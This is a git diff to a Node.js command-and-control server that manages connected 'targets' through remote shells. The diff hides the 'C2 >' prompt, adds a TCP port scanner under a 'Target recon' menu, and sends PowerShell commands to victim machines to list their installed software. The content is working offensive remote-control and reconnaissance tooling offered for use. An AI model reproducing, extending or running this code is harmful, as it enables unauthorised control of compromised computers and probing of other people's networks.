@@ -114,7 +114,7 @@ function setupListener(port = 444) {
             }
         
             if (clients[clientId].interactiveMode) {
-                process.stdout.write(`${response}\nC2 > `);
+                process.stdout.write(`${response}\n> `);
             }
         });
         
@@ -163,7 +163,7 @@ function killListener() {
     }
 }
 
-function listClients() {
+async function listClients() {
     if (Object.keys(clients).length > 0) {
         console.log("Connected Clients:");
         Object.keys(clients).forEach(clientId => {
@@ -192,7 +192,7 @@ function interactWithClient(clientId) {
         const rl = readline.createInterface({
             input: process.stdin,
             output: process.stdout,
-            prompt: "C2 > "
+            prompt: "> "
         });
 
         rl.prompt();
@@ -237,6 +237,55 @@ async function removeClient(clientId) {
     }
 }
 
+function isPortOpen(ip, port, timeout = 2000) {
+    return new Promise((resolve) => {
+        const socket = new net.Socket();
+        let isOpen = false;
+
+        socket.setTimeout(timeout);
+
+        socket.on("connect", () => {
+            isOpen = true;
+            socket.destroy();
+        });
+
+        socket.on("timeout", () => {
+            socket.destroy();
+        });
+
+        socket.on("error", () => {
+        });
+
+        socket.on("close", () => {
+            resolve(isOpen);
+        });
+
+        socket.connect(port, ip);
+    });
+}
+
+async function checkOpenPorts(ip, ports) {
+    console.log(`\nScanning ports on ${ip}...\n`.yellow);
+    const scanResults = [];
+
+    for (const port of ports) {
+        process.stdout.write(`Checking port ${port}... `);
+        const open = await isPortOpen(ip, port);
+        if (open) {
+            console.log(`Open`.green);
+            scanResults.push(port);
+        } else {
+            console.log(`Closed`.red);
+        }
+    }
+
+    if (scanResults.length > 0) {
+        console.log(`\nOpen ports on ${ip}: ${scanResults.join(", ")}`.green);
+    } else {
+        console.log(`\nNo open ports found on ${ip}.`.red);
+    }
+}
+
 function displayMenu() {
     printHeader();
     if (global.rl && !global.rl.closed) {
@@ -258,6 +307,9 @@ function displayMenu() {
     5) Show interaction logs
     6) List running apps on a target
     7) Remove connected target`)
+    console.log(`
+    Target recon:`.green)
+    console.log(`    8) Check for open ports`)
     console.log(`
     q) Exit\n`.red);
 
@@ -290,10 +342,10 @@ function displayMenu() {
             case "6":
                 global.rl.question("Enter client ID for installed application list: ", (clientId) => {
                     if (clients[clientId]) {
-                        console.log(`Fetching installed applications list for Client ${clientId}...`);
+                        console.log(`Fetching installed applications list for Client ${clientId}. This may take a while...`);
                         
-                        clients[clientId].socket.write("wmic product get name\n");
-                        
+                        clients[clientId].socket.write(`powershell -Command "$apps = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -notlike '*Microsoft*' -and $_.Name -notlike '*SDK*' -and $_.Name -notlike '*Windows*' -and $_.Name -notlike '*Visual C++*' }; $apps | ForEach-Object { $_.Name } | Out-String -Stream | %{$_ -replace '\\n\\n', '\\n'} | Out-String"\n`);
+            
                         clients[clientId].interactiveMode = true;
             
                         const waitForOutput = readline.createInterface({
@@ -319,6 +371,19 @@ function displayMenu() {
                     waitForUserInput(global.rl);
                 });
                 break;
+            case "8":
+                global.rl.question("Enter IP address to scan: ", async (ip) => {
+                    const common_ports = [20, 21, 22, 53, 80, 443, 444, 445, 3306, 3389];
+                    const ipRegex = /^(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)){3}$/;
+                    if (!ipRegex.test(ip.trim())) {
+                        console.log("Invalid IP address format.".red);
+                        waitForUserInput(global.rl);
+                        return;
+                    }
+                    await checkOpenPorts(ip.trim(), common_ports);
+                    waitForUserInput(global.rl);
+                });
+                break;
             case "q":
                 console.log("Exiting...");
                 global.rl.close();
@@ -333,7 +398,7 @@ function displayMenu() {
 }
 
 function waitForUserInput(rl) {
-    rl.question("\nPress enter to continue...", () => {
+    rl.question("\nPress enter to continue...\n", () => {
         rl.close();
         console.clear();
         displayMenu();
